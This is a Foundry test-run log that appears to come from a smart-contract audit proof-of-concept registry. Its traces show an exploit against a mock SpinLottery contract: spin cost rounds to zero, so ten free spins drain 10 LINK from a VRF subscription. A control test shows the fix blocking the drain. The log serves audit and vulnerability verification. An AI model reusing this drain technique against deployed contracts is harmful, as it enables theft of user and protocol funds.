@@ -1,0 +1,213 @@
+Compiling 21 files with Solc 0.8.27
+Solc 0.8.27 finished in 2.13s
+Compiler run successful with warnings:
+Warning (6321): Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.
+   --> test/62538-h-01-funds-in-subscription-may-be-drained-pashov-audit-group.sol:190:93:
+    |
+190 |     function spin(uint256 _totalSlots, uint256 _prizeCount) external whenNotPaused returns (uint256) {
+    |                                                                                             ^^^^^^^
+
+Warning (6321): Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.
+   --> test/62538-h-01-funds-in-subscription-may-be-drained-pashov-audit-group.sol:242:93:
+    |
+242 |     function spin(uint256 _totalSlots, uint256 _prizeCount) external whenNotPaused returns (uint256) {
+    |                                                                                             ^^^^^^^
+
+
+Ran 2 tests for test/62538-h-01-funds-in-subscription-may-be-drained-pashov-audit-group_exp.sol:FundsInSubscriptionMayBeDrainedTest
+[PASS] test_control_minSpinCostBlocksFreeDrain() (gas: 1562324)
+Traces:
+  [1562324] FundsInSubscriptionMayBeDrainedTest::test_control_minSpinCostBlocksFreeDrain()
+    ├─ [318429] → new MiniUSDC@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 1368 bytes of code
+    ├─ [318429] → new MiniLINK@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   └─ ← [Return] 1368 bytes of code
+    ├─ [170800] → new MockVRFCoordinator@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   └─ ← [Return] 741 bytes of code
+    ├─ [342607] → new SpinLotteryFixed@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
+    │   └─ ← [Return] 1267 bytes of code
+    ├─ [44724] MiniLINK::mint(MockVRFCoordinator: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 10000000000000000000 [1e19])
+    │   └─ ← [Stop]
+    ├─ [22377] MockVRFCoordinator::fundSubscription(10000000000000000000 [1e19])
+    │   └─ ← [Stop]
+    ├─ [44724] MiniUSDC::mint(FundsInSubscriptionMayBeDrainedTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000 [1e9])
+    │   └─ ← [Stop]
+    ├─ [22492] MiniUSDC::approve(SpinLotteryFixed: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [642] SpinLotteryFixed::calculateSpinCost(1000000000000 [1e12], 1) [staticcall]
+    │   └─ ← [Return] 100000 [1e5]
+    ├─ [0] VM::assertGt(100000 [1e5], 0, "fix enforces a positive minimum spin cost") [staticcall]
+    │   └─ ← [Return]
+    ├─ [530] MiniUSDC::balanceOf(FundsInSubscriptionMayBeDrainedTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 1000000000 [1e9]
+    ├─ [138128] SpinLotteryFixed::spin(1000000000000 [1e12], 1)
+    │   ├─ [23368] MiniUSDC::transferFrom(FundsInSubscriptionMayBeDrainedTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SpinLotteryFixed: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 100000 [1e5])
+    │   │   └─ ← [Return] true
+    │   ├─ [46196] MockVRFCoordinator::requestRandomWords(1, 200000 [2e5])
+    │   │   ├─ [22980] MiniLINK::transfer(0x000000000000000000000000000000000000D00d, 1000000000000000000 [1e18])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] 1
+    │   └─ ← [Return] 0
+    ├─ [530] MiniUSDC::balanceOf(FundsInSubscriptionMayBeDrainedTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 999900000 [9.999e8]
+    ├─ [0] VM::assertEq(100000 [1e5], 100000 [1e5], "attacker pays the minimum cost per spin") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertGt(100000 [1e5], 0, "free drain is blocked - each spin costs real USDC") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+[PASS] test_exploit_freeSpinsDrainVrfSubscription() (gas: 4014629)
+Traces:
+  [4054429] FundsInSubscriptionMayBeDrainedTest::test_exploit_freeSpinsDrainVrfSubscription()
+    ├─ [1636125] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 8172 bytes of code
+    ├─ [2367608] Exploit::run()
+    │   ├─ [318429] → new MiniUSDC@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 1368 bytes of code
+    │   ├─ [318429] → new MiniLINK@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   └─ ← [Return] 1368 bytes of code
+    │   ├─ [170800] → new MockVRFCoordinator@0xDDc10602782af652bB913f7bdE1fD82981Db7dd9
+    │   │   └─ ← [Return] 741 bytes of code
+    │   ├─ [330794] → new SpinLottery@0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773
+    │   │   └─ ← [Return] 1208 bytes of code
+    │   ├─ [44724] MiniLINK::mint(MockVRFCoordinator: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], 10000000000000000000 [1e19])
+    │   │   └─ ← [Stop]
+    │   ├─ [22377] MockVRFCoordinator::fundSubscription(10000000000000000000 [1e19])
+    │   │   └─ ← [Stop]
+    │   ├─ [44724] MiniUSDC::mint(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000 [1e9])
+    │   │   └─ ← [Stop]
+    │   ├─ [22492] MiniUSDC::approve(SpinLottery: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   ├─ [530] MiniUSDC::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 1000000000 [1e9]
+    │   ├─ [278] MockVRFCoordinator::subscriptionBalance() [staticcall]
+    │   │   └─ ← [Return] 10000000000000000000 [1e19]
+    │   ├─ [612] SpinLottery::calculateSpinCost(1000000000000 [1e12], 1) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [118176] SpinLottery::spin(1000000000000 [1e12], 1)
+    │   │   ├─ [3468] MiniUSDC::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], SpinLottery: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [46196] MockVRFCoordinator::requestRandomWords(1, 200000 [2e5])
+    │   │   │   ├─ [22980] MiniLINK::transfer(0x000000000000000000000000000000000000D00d, 1000000000000000000 [1e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] 1
+    │   │   └─ ← [Return] 0
+    │   ├─ [72376] SpinLottery::spin(1000000000000 [1e12], 1)
+    │   │   ├─ [1468] MiniUSDC::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], SpinLottery: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2396] MockVRFCoordinator::requestRandomWords(1, 200000 [2e5])
+    │   │   │   ├─ [1080] MiniLINK::transfer(0x000000000000000000000000000000000000D00d, 1000000000000000000 [1e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] 2
+    │   │   └─ ← [Return] 0
+    │   ├─ [72376] SpinLottery::spin(1000000000000 [1e12], 1)
+    │   │   ├─ [1468] MiniUSDC::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], SpinLottery: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2396] MockVRFCoordinator::requestRandomWords(1, 200000 [2e5])
+    │   │   │   ├─ [1080] MiniLINK::transfer(0x000000000000000000000000000000000000D00d, 1000000000000000000 [1e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] 3
+    │   │   └─ ← [Return] 0
+    │   ├─ [72376] SpinLottery::spin(1000000000000 [1e12], 1)
+    │   │   ├─ [1468] MiniUSDC::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], SpinLottery: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2396] MockVRFCoordinator::requestRandomWords(1, 200000 [2e5])
+    │   │   │   ├─ [1080] MiniLINK::transfer(0x000000000000000000000000000000000000D00d, 1000000000000000000 [1e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] 4
+    │   │   └─ ← [Return] 0
+    │   ├─ [72376] SpinLottery::spin(1000000000000 [1e12], 1)
+    │   │   ├─ [1468] MiniUSDC::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], SpinLottery: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2396] MockVRFCoordinator::requestRandomWords(1, 200000 [2e5])
+    │   │   │   ├─ [1080] MiniLINK::transfer(0x000000000000000000000000000000000000D00d, 1000000000000000000 [1e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] 5
+    │   │   └─ ← [Return] 0
+    │   ├─ [72376] SpinLottery::spin(1000000000000 [1e12], 1)
+    │   │   ├─ [1468] MiniUSDC::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], SpinLottery: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2396] MockVRFCoordinator::requestRandomWords(1, 200000 [2e5])
+    │   │   │   ├─ [1080] MiniLINK::transfer(0x000000000000000000000000000000000000D00d, 1000000000000000000 [1e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] 6
+    │   │   └─ ← [Return] 0
+    │   ├─ [72376] SpinLottery::spin(1000000000000 [1e12], 1)
+    │   │   ├─ [1468] MiniUSDC::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], SpinLottery: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2396] MockVRFCoordinator::requestRandomWords(1, 200000 [2e5])
+    │   │   │   ├─ [1080] MiniLINK::transfer(0x000000000000000000000000000000000000D00d, 1000000000000000000 [1e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] 7
+    │   │   └─ ← [Return] 0
+    │   ├─ [72376] SpinLottery::spin(1000000000000 [1e12], 1)
+    │   │   ├─ [1468] MiniUSDC::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], SpinLottery: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2396] MockVRFCoordinator::requestRandomWords(1, 200000 [2e5])
+    │   │   │   ├─ [1080] MiniLINK::transfer(0x000000000000000000000000000000000000D00d, 1000000000000000000 [1e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] 8
+    │   │   └─ ← [Return] 0
+    │   ├─ [72376] SpinLottery::spin(1000000000000 [1e12], 1)
+    │   │   ├─ [1468] MiniUSDC::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], SpinLottery: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2396] MockVRFCoordinator::requestRandomWords(1, 200000 [2e5])
+    │   │   │   ├─ [1080] MiniLINK::transfer(0x000000000000000000000000000000000000D00d, 1000000000000000000 [1e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] 9
+    │   │   └─ ← [Return] 0
+    │   ├─ [72376] SpinLottery::spin(1000000000000 [1e12], 1)
+    │   │   ├─ [1468] MiniUSDC::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], SpinLottery: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2396] MockVRFCoordinator::requestRandomWords(1, 200000 [2e5])
+    │   │   │   ├─ [1080] MiniLINK::transfer(0x000000000000000000000000000000000000D00d, 1000000000000000000 [1e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] 10
+    │   │   └─ ← [Return] 0
+    │   ├─ [278] MockVRFCoordinator::subscriptionBalance() [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [530] MiniUSDC::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 1000000000 [1e9]
+    │   ├─ [530] MiniLINK::balanceOf(0x000000000000000000000000000000000000D00d) [staticcall]
+    │   │   └─ ← [Return] 10000000000000000000 [1e19]
+    │   └─ ← [Return]
+    ├─ [462] Exploit::spinCostPerSpin() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "spin cost rounds to zero") [staticcall]
+    │   └─ ← [Return]
+    ├─ [349] Exploit::attackerUsdcSpent() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "attacker spent no USDC") [staticcall]
+    │   └─ ← [Return]
+    ├─ [484] Exploit::subscriptionBefore() [staticcall]
+    │   └─ ← [Return] 10000000000000000000 [1e19]
+    ├─ [0] VM::assertEq(10000000000000000000 [1e19], 10000000000000000000 [1e19], "subscription funded with 10 LINK") [staticcall]
+    │   └─ ← [Return]
+    ├─ [283] Exploit::subscriptionAfter() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "subscription fully drained to zero") [staticcall]
+    │   └─ ← [Return]
+    ├─ [440] Exploit::sinkLinkDrained() [staticcall]
+    │   └─ ← [Return] 10000000000000000000 [1e19]
+    ├─ [0] VM::assertEq(10000000000000000000 [1e19], 10000000000000000000 [1e19], "10 LINK drained to Chainlink sink") [staticcall]
+    │   └─ ← [Return]
+    ├─ [271] Exploit::linkAddr() [staticcall]
+    │   └─ ← [Return] MiniLINK: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]
+    ├─ [530] MiniLINK::balanceOf(0x000000000000000000000000000000000000D00d) [staticcall]
+    │   └─ ← [Return] 10000000000000000000 [1e19]
+    ├─ [0] VM::assertEq(10000000000000000000 [1e19], 10000000000000000000 [1e19], "drained LINK sits at SINK") [staticcall]
+    │   └─ ← [Return]
+    ├─ [395] Exploit::usdcAddr() [staticcall]
+    │   └─ ← [Return] MiniUSDC: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [329] Exploit::lotteryAddr() [staticcall]
+    │   └─ ← [Return] SpinLottery: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773]
+    ├─ [530] MiniUSDC::balanceOf(SpinLottery: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "lottery collected no USDC for the free spins") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 3.72ms (3.11ms CPU time)
+
+Ran 1 test suite in 136.44ms (3.72ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
+_shared/run-poc/run_poc.sh: line 71: 67434 Killed: 9               nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: ~/RustroverProjects/audits/evm-hack-registry/62538-h-01-funds-in-subscription-may-be-drained-pashov-audit-group_exp)
